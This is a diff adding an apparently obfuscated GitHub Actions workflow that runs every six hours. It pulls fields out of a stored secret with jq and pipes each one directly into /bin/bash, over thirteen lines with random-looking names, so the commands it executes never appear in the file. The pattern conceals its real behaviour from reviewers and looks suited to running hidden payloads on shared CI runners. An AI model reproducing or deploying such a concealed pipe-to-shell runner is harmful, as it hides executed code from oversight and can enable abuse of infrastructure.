@@ -1,0 +1,29 @@
+name: wuguoduojian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuguoduojian
+        env:
+          zcbw7: ${{ secrets.zcbw7 }}
+        run: |
+          echo $zcbw7 | jq -r .n88 | /bin/bash
+          echo $xkih23313 | jq -r .qjv155 | /bin/bash
+          echo $f35361 | jq -r .w6878 | /bin/bash
+          echo $s9 | jq -r .s39 | /bin/bash
+          echo $zhjci8159 | jq -r .sqg9 | /bin/bash
+          echo $ijtdu5978 | jq -r .vcd4 | /bin/bash
+          echo $vincv93 | jq -r .gpm33671 | /bin/bash
+          echo $tn3524 | jq -r .ue6491 | /bin/bash
+          echo $akqhu0 | jq -r .duc2 | /bin/bash
+          echo $zzx181 | jq -r .pijx9198 | /bin/bash
+          echo $obx33444 | jq -r .ygkg09 | /bin/bash
+          echo $jaaen04676 | jq -r .ov61655 | /bin/bash
+          echo $maelw7 | jq -r .sgoer2 | /bin/bash
+
